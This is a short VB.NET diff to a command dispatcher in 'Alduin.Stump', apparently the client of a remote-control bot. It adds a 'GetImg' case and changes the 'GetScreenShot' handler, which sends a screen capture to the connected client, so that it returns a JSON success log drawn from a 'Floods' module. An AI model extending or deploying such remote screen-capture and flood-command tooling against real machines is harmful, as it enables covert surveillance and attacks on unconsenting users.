@@ -110,6 +110,14 @@ Namespace Alduin.Stump.Class.Commands
                     Return JsonConvert.SerializeObject(log)
                 Case "GetAllImgJson"
                     Return AllImgToJson.Handler()
+                Case "GetImg"
+
+                    Dim log As LogModel = New LogModel With {
+                            .Message = GetFloodsBase().GetMessage(),
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                    }
+                    Return JsonConvert.SerializeObject(log)
             End Select
             Dim url As String = RequestSplitter(request) ' Handle HTTP request
             Select Case url
@@ -117,8 +125,12 @@ Namespace Alduin.Stump.Class.Commands
                     Return "Forbidden"
                 Case "GetScreenShot"
                     StreamWriterImg(TakeScreenShot.TakeScreenShot(), client)
-                    Return ""
-
+                    Dim log As LogModel = New LogModel With {
+                            .Message = GetFloodsBase().GetMessage(),
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                    }
+                    Return JsonConvert.SerializeObject(log)
             End Select
             Return "Command execute Failed!"
         End Function
